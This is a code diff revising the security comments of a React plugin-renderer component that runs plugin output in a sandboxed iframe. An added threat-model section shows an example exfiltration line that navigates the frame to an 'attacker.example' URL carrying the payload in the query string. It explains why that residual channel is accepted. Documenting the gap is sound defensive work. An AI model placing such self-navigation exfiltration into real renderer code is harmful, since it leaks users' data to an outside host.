@@ -13,10 +13,9 @@
  *   [pluginId]/[file]/route.ts`) is same-origin with Paco's own app, and
  *   `allow-same-origin` would let it use that origin's `document.cookie`,
  *   `localStorage`, and `fetch` credentials. Omitting it makes the
- *   document's origin opaque ("null") instead, so it has none of that —
- *   its only channel to the rest of the page is `postMessage`. And no
- *   `allow-top-navigation` / `allow-popups` (both absent by default): the
- *   frame cannot redirect the tab it's embedded in or open a new one.
+ *   document's origin opaque ("null") instead, so it has none of that. And
+ *   no `allow-top-navigation` / `allow-popups` (both absent by default):
+ *   the frame cannot redirect the TAB it's embedded in or open a new one.
  * - The tool call's own input/output — nothing else — is the only thing
  *   posted in. No ambient Paco state (session, cookies, other tool calls)
  *   ever reaches this frame.
@@ -25,6 +24,25 @@
  * `message` listener has to validate the sender by identity rather than by
  * `event.origin` — the opaque-origin document above makes `event.origin`
  * uninformative in both directions.
+ *
+ * ## What is NOT enforced
+ *
+ * `postMessage` to the parent is this frame's *intended* channel out — it
+ * is not its *only* one. `sandbox="allow-scripts"` without
+ * `allow-top-navigation` stops the frame from navigating the TOP window or
+ * any OTHER frame, but a sandboxed frame can always navigate ITSELF —
+ * `location.href = "https://attacker.example/?d=" + payload` — in every
+ * shipping browser, and no CSP directive (here or anywhere) closes that off;
+ * `default-src`/`connect-src 'none'` restricts `fetch`/`XHR`/`WebSocket`,
+ * not top-level navigation of the frame's own document. So a malicious
+ * renderer CAN exfiltrate whatever it was handed, by self-navigating to an
+ * attacker-controlled URL with the data in the query string or fragment.
+ * The mitigation is not preventing that channel — it can't be — it's
+ * making what travels through it worthless: the payload
+ * (`buildPluginToolCallMessage`) is exactly this one tool call's own
+ * `input`/`output`, the same data the equivalent non-plugin renderer
+ * already puts in the visible DOM. Nothing from Paco's session, other
+ * chats, or other tool calls is ever in it.
  */
 import type { ToolRenderState } from "@paco/shared/lib/tool-state";
 import { useEffect, useRef, useState } from "react";
@@ -162,9 +180,12 @@ export function PluginRenderer({
     // to match against — "*" is the only targetOrigin an opaque-origin
     // target can ever receive. That's acceptable here because the payload
     // carries nothing beyond this tool call's own input/output (see
-    // `buildPluginToolCallMessage`), and the sandbox's default-deny (no
-    // `allow-top-navigation`, no `allow-popups`) means this document has no
-    // way to redirect itself elsewhere before this same-tick send lands.
+    // `buildPluginToolCallMessage`) — NOT because the sandbox stops the
+    // frame from doing something worse with it. A sandboxed frame can
+    // always navigate itself (`location.href = ...`) regardless of when
+    // this send lands; see this file's header comment, "What is NOT
+    // enforced", for why that residual channel is accepted rather than
+    // closed.
     target.postMessage(buildPluginToolCallMessage(part), "*");
   }
 
